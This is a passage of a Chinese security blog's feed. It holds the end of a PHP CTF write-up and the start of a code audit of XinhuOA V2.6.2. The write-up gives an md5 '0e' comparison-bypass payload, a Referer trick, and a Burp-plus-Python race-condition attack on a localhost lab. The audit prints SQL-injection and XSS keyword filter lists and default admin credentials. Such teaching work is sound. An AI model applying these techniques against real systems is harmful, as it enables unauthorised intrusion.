fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;);</span></span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="variable">$savepath</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) . <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">100000</span>);</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Too slow!&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;form-group&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;label for=&quot;exampleInputEmail1&quot;&gt;Filename&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;form-group&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;label for=&quot;exampleInputPassword1&quot;&gt;Content&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">EOT</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can not see this page&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在 <strong>index.php</strong> 第4行存在 <strong>@parse_str($id);</strong> 这个函数不会检查变量 <strong>$id</strong> 是否存在，如果通过其他方式传入数据给变量 <strong>$id</strong> ,且当前 <strong>$id</strong> 中数据存在，它将会直接覆盖掉。而在第6行有一段这样代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>[<span class="number">0</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>))</span><br></pre></td></tr></table></figure><p><strong>PHP Hash比较存在缺陷</strong> ，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。而这里的 <strong>md5(‘QNKCDZO’)</strong> 的结果是 <strong>0e830400451993494058024219903391</strong>  。所以payload为 <strong>?id&#x3D;a[0]&#x3D;s878926199a</strong> 。这样就可以在页面上回显。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;uploadsomething.php&quot;</span>&gt;</span>flag is here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;;</span><br></pre></td></tr></table></figure><p>而这题真正的考察点在这里。在 <strong>uploadsomething.php</strong> 的第三行和第四行有这样两句代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$referer</span>)!== <span class="literal">false</span>)</span><br></pre></td></tr></table></figure><p>这里有个 <strong>refer</strong> 判断，判断 <strong>refer</strong> 是否存在，如果有展现上传页面，如果没有，就返回 <strong>you can not see this page</strong> 。</p><p>据我们所知，通过a标签点击的链接，会自己自动携带上refer字段。然后 <strong>携带refer</strong> 和 <strong>不携带refer</strong> ，返回的结果不一样。</p><p><strong>携带refer</strong> 的情况：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-55.png"></p><p><strong>不携带refer</strong> 的情况：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-56.png"></p><p>然后在 <strong>uploadsomething.php</strong> 的第13行和第18行有这样代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="variable">$savepath</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) . <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">100000</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;Too slow!&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>这里有一句关键就是 <strong>usleep(100000);</strong> 这题需要在写入 <strong>too slow</strong> 之前，访问之前写入的文件，即可获得flag，这里就存在时间竞争问题。但是我们看到其实这里的文件夹路径是固定写死的。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-57.png"></p><p>直接访问会返回 <strong>too slow</strong> 。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-58.png"></p><p>因此这里的解法是，开Burp的200线程，一个不断发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/parse_str/uploadsomething.php?filename=flag&amp;content=111</span><br></pre></td></tr></table></figure><p>burp发包是在 <strong>intruder</strong> 模块中，首先选择数据包，右键点击选择 <strong>Send to Intruder</strong> 。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-59.png"></p><p>然后在 <strong>positions</strong> 点击 <strong>clear</strong> 按钮</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-60.png"></p><p>在 <strong>payload</strong> 中选择 <strong>payload type</strong> 为 <strong>null payloads</strong> ，<strong>generate</strong> 选择200，然后再可以点击 <strong>start attack</strong> 了。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-61.png"></p><p>在 <strong>start attack</strong> 之前需要一个脚本不断请求下面这个链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/parse_str/uploads/4b84b15bff6ee5796152495a230e45e3d7e947d9/flag</span><br></pre></td></tr></table></figure><p><strong>脚本代码</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line">r1=r.Session()</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">r2=r1.get(<span class="string">&quot;http://127.0.0.1/parse_str/uploads/4b84b15bff6ee5796152495a230e45e3d7e947d9/flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> r2.text</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>一会儿就看到了flag</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-62.png"></p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】信呼OA V2.6.2 代码审计</title>
      <link href="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/"/>
      <url>/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/web/286380.html">https://www.freebuf.com/articles/web/286380.html</a></p><h2 id="信呼OA-审计"><a href="#信呼OA-审计" class="headerlink" title="信呼OA 审计"></a>信呼OA 审计</h2><p>admin qwer1234<br>信呼OA是一款自主MVC的办公系统，官网：<a href="http://www.rockoa.com/">http://www.rockoa.com/</a></p><h2 id="入口分析"><a href="#入口分析" class="headerlink" title="入口分析"></a>入口分析</h2><p>index.php 中 <code>include_once(&#39;config/config.php&#39;);</code> 跟进到 <code>config/config.php</code>查看<br><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image.png"><br><code>@session_start();</code> 这行代码在 PHP 中用来启动一个新的会话或者继续当前会话。这里解释一下各个组成部分的含义和作用：</p><ol><li><p><strong><code>session_start()</code> 函数</strong>：</p><ul><li>这个函数用来创建一个会话或者恢复基于会话标识符传递的当前已存在的会话。该函数使得 PHP 脚本能够使用 <code>$_SESSION</code> 超全局数组存储和访问会话数据。通过会话，服务器能够存储关于用户的状态信息（如用户身份验证状态、购物车内容等）。</li><li>会话数据在服务器端保存，通常在服务器的临时目录下，而不是用户的计算机上，从而增加了数据的安全性。客户端浏览器会保存一个会话 ID 的 cookie，该 ID 用来在多个页面请求之间识别用户。</li></ul></li><li><p><strong><code>@</code> 错误控制运算符</strong>：</p><ul><li>在 PHP 中，<code>@</code> 符号是一个错误控制运算符，用于抑制表达式可能产生的错误消息。当在表达式前加上 <code>@</code> 时，任何由该表达式产生的错误都不会显示出来，这使得代码在遇到非致命错误时可以继续执行。</li><li>使用这个运算符可以防止用户看到一些可能由会话启动问题（例如，当会话已经在另一个脚本中启动时）引起的警告信息。</li></ul></li><li><p><strong><code>if(function_exists(&#39;date_default_timezone_set&#39;))date_default_timezone_set(&#39;Asia/Shanghai&#39;);</code></strong></p><ul><li>这里检查 <code>date_default_timezone_set</code> 函数是否存在（主要是为了向后兼容老版本的PHP）。如果存在，就将默认时区设置为<code>&#39;Asia/Shanghai&#39;</code>。确保了所有基于时间的函数都将使用这个时区。</li></ul></li><li><p><strong><code>header(&#39;Content-Type:text/html;charset=utf-8&#39;);</code></strong></p><ul><li>这行代码设置HTTP响应的Content-Type头为<code>text/html</code>，并指定字符集为<code>UTF-8</code>。这告诉浏览器返回的内容是HTML文本，并且使用UTF-8编码，有助于正确显示包括中文在内的各种字符。</li></ul></li><li><p><strong><code>define(&#39;ROOT_PATH&#39;,str_replace(&#39;\\&#39;,&#39;/&#39;,dirname(dirname(__FILE__))));</code></strong></p><ul><li>这行代码定义了一个常量<code>ROOT_PATH</code>，用于存储系统的根目录路径。它使用<code>dirname(dirname(__FILE__))</code>来找到当前文件的上级目录的上级目录（即根目录），并将所有的反斜杠(‘\‘)替换为正斜杠(‘&#x2F;‘)，以保证路径在不同操作系统下都是有效的。</li></ul></li></ol><p>之后分析包含的其中包含的文件<code>rockFun.php, Chajian.php</code>，其中都没什么内容，rockclass.php深入分析</p><h2 id="Rockclass"><a href="#Rockclass" class="headerlink" title="Rockclass"></a>Rockclass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;ip= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getclientip</span>();  <span class="comment">// 获取客户端 IP 地址</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;host= <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>])? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]: <span class="string">&#x27;&#x27;</span> ;  <span class="comment">// 获取和处理 HTTP 主机名</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;host &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;host,-<span class="number">3</span>)==<span class="string">&#x27;:80&#x27;</span>)<span class="variable language_">$this</span>-&gt;host = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:80&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$this</span>-&gt;host);   <span class="comment">// 如果主机名以端口号 80 结束，则从主机名中移除端口号。</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;url= <span class="string">&#x27;&#x27;</span>;  <span class="comment">// 当前 URL</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;isqywx= <span class="literal">false</span>;  <span class="comment">// 是否企业微信</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;win= <span class="title function_ invoke__">php_uname</span>();  <span class="comment">// 当前操作系统</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;HTTPweb= <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>])? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]: <span class="string">&#x27;&#x27;</span> ;  <span class="comment">// 获取客户端浏览器信息</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;web= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getbrowser</span>();  <span class="comment">// 获取客户端浏览器信息</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;unarr= <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;1,2&#x27;</span>);  <span class="comment">// 允许上传文件类型</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;now= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">now</span>();  <span class="comment">// 当前时间</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;date= <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>);  <span class="comment">// 当前日期</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;lvlaras  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;select ,</span></span><br><span class="line"><span class="string">alter table,delete ,drop ,update ,insert into,load_file,/*,*/,union,&lt;script,&lt;/script,sleep(,outfile,eval(,user(,phpinfo(),select*,union%20,sleep%20,select%20,delete%20,drop%20,and%20&#x27;</span>);  <span class="comment">// SQL 注入关键字</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;lvlaraa  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;select,alter,delete,drop,update,/*,*/,insert,from,time_so_sec,convert,from_unixtime,unix_timestamp,curtime,time_format,union,concat,information_schema,group_concat,length,load_file,outfile,database,system_user,current_user,user(),found_rows,declare,master,exec,(),select*from,select*&#x27;</span>);  <span class="comment">// SQL 注入关键字</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;lvlarab= <span class="keyword">array</span>();  </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;lvlaraa <span class="keyword">as</span> <span class="variable">$_i</span>)<span class="variable language_">$this</span>-&gt;lvlarab[]=<span class="string">&#x27;&#x27;</span>;   <span class="comment">// 创建一个与 $this-&gt;lvlaraa 数组相同大小的空数组，用于存储过滤后的 SQL 注入关键字。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XSS过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">xssrepstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$xpd</span>  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;(,), ,,&lt;,&gt;,\\,*,&amp;,%,$,^,[,],&#123;,&#125;,!,@,#,&quot;,+,?,;\&#x27;&#x27;</span>);</span><br><span class="line"><span class="variable">$xpd</span>[]= <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$xpd</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取客户端IP地址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*获取IP</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getclientip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ip</span>= <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">xssrepstr</span>(<span class="variable">$ip</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>)&#123;<span class="variable">$ipar</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$ip</span>);<span class="keyword">foreach</span>(<span class="variable">$ipar</span> <span class="keyword">as</span> <span class="variable">$ip1</span>)<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ip1</span>))<span class="variable">$ip</span>=<span class="string">&#x27;&#x27;</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$ip</span>)<span class="variable">$ip</span> = <span class="string">&#x27;unknow&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>iconvsql</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">iconvsql</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$lx</span>=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$this</span>-&gt;lvlaraa,<span class="variable">$this</span>-&gt;lvlarab,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$lx</span>==<span class="number">1</span>) <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>功能与作用：</strong></p><ul><li>这个方法用于处理和清理 SQL 语句，以防止 SQL 注入攻击。</li><li><code>str_ireplace($this-&gt;lvlaraa, $this-&gt;lvlarab, $str)</code> 替换掉字符串 <code>$str</code> 中所有在 <code>$this-&gt;lvlaraa</code> 数组中定义的SQL关键词为 <code>$this-&gt;lvlarab</code> 数组中相应的空字符串，这种方法用于尝试清除可能导致SQL注入的语句。</li><li><code>str_replace(&quot;\n&quot;, &#39;&#39;, $str)</code> 移除字符串中的所有换行符。</li><li>如果参数 <code>$lx</code> 等于 <code>1</code>，则进一步移除字符串中的所有空格和制表符。这可能用于进一步减少 SQL 语句中不必要的空白，以减小其在数据库查询中的潜在危险。</li></ul><p><code>unstr</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">unstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ystr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;unarr); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">contain</span>(<span class="variable">$str</span>, <span class="variable">$this</span>-&gt;unarr[<span class="variable">$i</span>]))&#123;</span><br><span class="line">            <span class="variable">$ystr</span> = <span class="variable language_">$this</span>-&gt;unarr[<span class="variable">$i</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ystr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>功能与作用：</strong></p><ul><li>这个私有方法用于检查字符串 <code>$str</code> 是否包含在类变量 <code>$this-&gt;unarr</code> 定义的特定值中。</li><li>通过遍历 <code>$this-&gt;unarr</code> 数组，并使用 <code>contain</code> 方法检查 <code>$str</code> 是否包含数组中的任何一个元素。如果是，就将该元素赋值给 <code>$ystr</code> 并终止循环。</li><li>返回的 <code>$ystr</code> 会是 <code>$str</code> 中第一个在 <code>$this-&gt;unarr</code> 数组中找到匹配的字符串，如果没有找到，则返回空字符串。</li></ul><h2 id="回到index"><a href="#回到index" class="headerlink" title="回到index"></a>回到index</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;config/config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$_uurl</span> = <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;rewriteurl&#x27;</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_uurl</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);<span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);<span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="variable">$m</span>= <span class="variable">$_uurl</span>;</span><br><span class="line"><span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;_&#x27;</span>, <span class="variable">$_uurl</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">1</span>]))&#123;<span class="variable">$d</span> = <span class="variable">$_uurla</span>[<span class="number">0</span>];<span class="variable">$m</span> = <span class="variable">$_uurla</span>[<span class="number">1</span>];&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">2</span>]))&#123;<span class="variable">$d</span> = <span class="variable">$_uurla</span>[<span class="number">0</span>];<span class="variable">$m</span> = <span class="variable">$_uurla</span>[<span class="number">1</span>];<span class="variable">$a</span> = <span class="variable">$_uurla</span>[<span class="number">2</span>];&#125;</span><br><span class="line"><span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;?&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">1</span>]))&#123;</span><br><span class="line"><span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="variable">$_uurla</span>[<span class="number">1</span>]);<span class="keyword">foreach</span>(<span class="variable">$_uurla</span> <span class="keyword">as</span> <span class="variable">$_uurlas</span>)&#123;</span><br><span class="line"><span class="variable">$_uurlasa</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;=&#x27;</span>, <span class="variable">$_uurlas</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurlasa</span>[<span class="number">1</span>]))<span class="variable">$_GET</span>[<span class="variable">$_uurlasa</span>[<span class="number">0</span>]]=<span class="variable">$_uurlasa</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span 